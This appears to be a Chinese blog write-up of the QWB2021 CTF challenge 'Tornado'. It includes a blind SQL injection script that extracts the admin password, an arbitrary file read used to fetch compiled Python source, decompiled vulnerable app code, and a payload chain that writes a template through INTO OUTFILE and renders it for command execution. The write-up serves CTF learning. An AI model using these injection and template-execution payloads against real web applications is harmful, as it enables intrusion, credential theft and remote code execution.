---

title: QWB2021 Quals 托纳多
date: 2021-07-23 13:50:49
updated: 2021-07-23 13:50:49
categories: Write up
---

强网杯2021-托纳多复现<!--more-->

## sql注入获取admin账号密码

**利用`processlist`表读取正在执行的sql语句，从而得到表名与列名**

<img src="http://img.npfs06.top/20210723105353.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />

```python
import requests
url = "http://9ea19d02-b943-4a06-9d06-ee9e316803a0.node4.buuoj.cn/"
for n in range(0,150):
    for i in range(31,300):
        # payload = "if((ascii(substr((select (info)  FROM information_schema.processlist limit 0,1)," + str( n + 1) + ",1)) in (" + str(i) + ")),1,0)"
        #SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser='andmin'
        payload = "if((ascii(substr((select qwbqwbqwbpass FROM qwbtttaaab111e limit 0,1)," + str(n + 1) + ",1)) in (" + str(i) + ")),1,0)"
        #glzjin666888
        r = requests.get(url + "register.php?username=admin' and " + payload + " and '1&password=1")
        if ("username" in r.text):
            print(chr(i), end="")
            break
        elif("success" not in r.text):
            print("n= "+str(n)+" i= "+str(i)+"|"+r.text)
        
#glzjin666888
```

## os.path.join任意文件读取

得到密码后，登入即可，但是在buu发现，无法以admin身份登录，所以这一步只能跳过了

预期解登入后，会看到一个图片，通过图片接口可有任意文件读取

然后读/proc/self/cmdline

可以得到python应用运行路径 python3 /qwb/app/app.py
读app.py和flag不允许，但是python有个pyc文件，

pyc文件是有一定的命名规则的，既然我们得知了app.py的目录，我们就可以去该目录寻找pyc文件。pyc的命名规则为`__pycache__/文件名.cpython-2位版本号.pyc`，这里文件名为app，版本号需要爆破一下，其实如果你留心的话，本服务器在http返回头中返回了tornado版本号（tornado默认返回的）为`Server: TornadoServer/6.0.3`，而该版本的tornado只支持python3.5及其以上版本，因此这里只需要随便猜几次就猜到python版本号了。最终payload为：

```
/qwbimage.php?qwb_image_name=/qwb/app/__pycache__/app.cpython-35.pyc
```

反编译后得到源码如下：

```python
import tornado.ioloop, tornado.web, tornado.options, pymysql, os, re
settings = {'static_path': os.path.join(os.getcwd(), 'static'),
 'cookie_secret': 'b93a9960-bfc0-11eb-b600-002b677144e0'}
db_username = 'root'
db_password = 'xxxx'
class MainHandler(tornado.web.RequestHandler):

    def get(self):
        user = self.get_secure_cookie('user')
        if user and user == b'admin':
            self.redirect('/admin.php', permanent=True)
            return
        self.render('index.html')
        
class LoginHandler(tornado.web.RequestHandler):

    def get(self):
        username = self.get_argument('username', '')
        password = self.get_argument('password', '')
        if not username or not password:
            if not self.get_secure_cookie('user'):
                self.finish('<script>alert(`please input your password and username`);history.go(-1);</script>')
                return
            if self.get_secure_cookie('user') == b'admin':
                self.redirect('/admin.php', permanent=True)
            else:
                self.redirect('/', permanent=True)
        else:
            conn = pymysql.connect('localhost', db_username, db_password, 'qwb')
            cursor = conn.cursor()
            cursor.execute('SELECT * from qwbtttaaab111e where qwbqwbqwbuser=%s and qwbqwbqwbpass=%s', [username, password])
            results = cursor.fetchall()
            if len(results) != 0:
                if results[0][1] == 'admin':
                    self.set_secure_cookie('user', 'admin')
                    cursor.close()
                    conn.commit()
                    conn.close()
                    self.redirect('/admin.php', permanent=True)
                    return
                else:
                    cursor.close()
                    conn.commit()
                    conn.close()
                    self.finish('<script>alert(`login success, but only admin can get flag`);history.go(-1);</script>')
                    return
            else:
                cursor.close()
                conn.commit()
                conn.close()
                self.finish('<script>alert(`your username or password is error`);history.go(-1);</script>')
                return
            
class RegisterHandler(tornado.web.RequestHandler):

    def get(self):
        username = self.get_argument('username', '')
        password = self.get_argument('password', '')
        word_bans = ['table', 'col', 'sys', 'union', 'inno', 'like', 'regexp']
        bans = ['"', '#', '%', '&', ';', '<', '=', '>', '\\', '^', '`', '|', '*', '--', '+']
        for ban in word_bans:
            if re.search(ban, username, re.IGNORECASE):
                self.finish('<script>alert(`error`);history.go(-1);</script>')
                return

        for ban in bans:
            if ban in username:
                self.finish('<script>alert(`error`);history.go(-1);</script>')
                return
        if not username or not password:
            self.render('register.html')
            return
        if username == 'admin':
            self.render('register.html')
            return
        conn = pymysql.connect('localhost', db_username, db_password, 'qwb')
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser='%s'" % username)
            results = cursor.fetchall()
            if len(results) != 0:
                self.finish('<script>alert(`this username had been used`);history.go(-1);</script>')
                conn.commit()
                conn.close()
                return
        except:
            conn.commit()
            conn.close()
            self.finish('<script>alert(`error`);history.go(-1);</script>')
            return
        try:
            cursor.execute('insert into qwbtttaaab111e (qwbqwbqwbuser, qwbqwbqwbpass) values(%s, %s)', [username, password])
            conn.commit()
            conn.close()
            self.finish("<script>alert(`success`);location.href='/index.php';</script>")
            return
        except:
            conn.rollback()
            conn.close()
            self.finish('<script>alert(`error`);history.go(-1);</script>')
            return
            
class LogoutHandler(tornado.web.RequestHandler):

    def get(self):
        self.clear_all_cookies()
        self.redirect('/', permanent=True)
        
class AdminHandler(tornado.web.RequestHandler):

    def get(self):
        user = self.get_secure_cookie('user')
        if not user or user != b'admin':
            self.redirect('/index.php', permanent=True)
            return
        self.render('admin.html')

class ImageHandler(tornado.web.RequestHandler):

    def get(self):
        user = self.get_secure_cookie('user')
        image_name = self.get_argument('qwb_image_name', 'header.jpeg')
        if not image_name:
            self.redirect('/', permanent=True)
            return
        else:
            if not user or user != b'admin':
                self.redirect('/', permanent=True)
                return
            if image_name.endswith('.py') or 'flag' in image_name or '..' in image_name:
                self.finish("nonono, you can't read it.")
                return
            image_name = os.path.join(os.getcwd() + '/image', image_name)
            with open(image_name, 'rb') as (f):
                img = f.read()
            self.set_header('Content-Type', 'image/jpeg')
            self.finish(img)
            return
        
class SecretHandler(tornado.web.RequestHandler):
    def get(self):
        if len(tornado.web.RequestHandler._template_loaders):
            for i in tornado.web.RequestHandler._template_loaders:
                tornado.web.RequestHandler._template_loaders[i].reset()

        msg = self.get_argument('congratulations', 'oh! you find it')
        bans = []
        for ban in bans:
            if ban in msg:
                self.finish('bad hack,go out!')
                return

        with open('congratulations.html', 'w') as (f):
            f.write('<html><head><title>congratulations</title></head><body><script type="text/javascript">alert("%s");location.href=\'/admin.php\';</script></body></html>\n' % msg)
            f.flush()
        self.render('congratulations.html')
        if tornado.web.RequestHandler._template_loaders:
            for i in tornado.web.RequestHandler._template_loaders:
                tornado.web.RequestHandler._template_loaders[i].reset()
                
def make_app():
    return tornado.web.Application([
     (
      '/index.php', MainHandler),
     (
      '/login.php', LoginHandler),
     (
      '/logout.php', LogoutHandler),
     (
      '/register.php', RegisterHandler),
     (
      '/admin.php', AdminHandler),
     (
      '/qwbimage.php', ImageHandler),
     (
      '/good_job_my_ctfer.php', SecretHandler),
     (
      '/', MainHandler)], **settings)


if __name__ == '__main__':
    app = make_app()
    app.listen(8000)
    tornado.ioloop.IOLoop.current().start()
    print('start')
```



<img src="http://img.npfs06.top/20210723155111.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />

在`/good_job_my_ctfer.php`路由对应的处理部分，有个ssti，但过滤的很死。因为`{{}}`被过滤，所以只能用`{%%}\` 这一步用到的为**{%extends %}**，它的参数为一个文件，会将其包含并渲染。所以思路为上传一个文件，然后extends包含并渲染。这里通过register向服务器写入文件。具体实现为通过注册功能将代码写入数据库，再通过`into outfile`语句将其导出为文件。导出文件路径为`/var/lib/mysql-files/`，因为mysql只在这里有写的权限。

exp

```
/register.php?username=npfs&password={% set return __import__("os").popen("cat  /flag").read()%}
/register.php?username=npfs' into outfile '/var/lib/mysql-files/npfs&password=npfs
/good_job_my_ctfer.php?congratulations={% extends /var/lib/mysql-files/npfs%}
```



参考链接：https://www.anquanke.com/post/id/244153#h2-4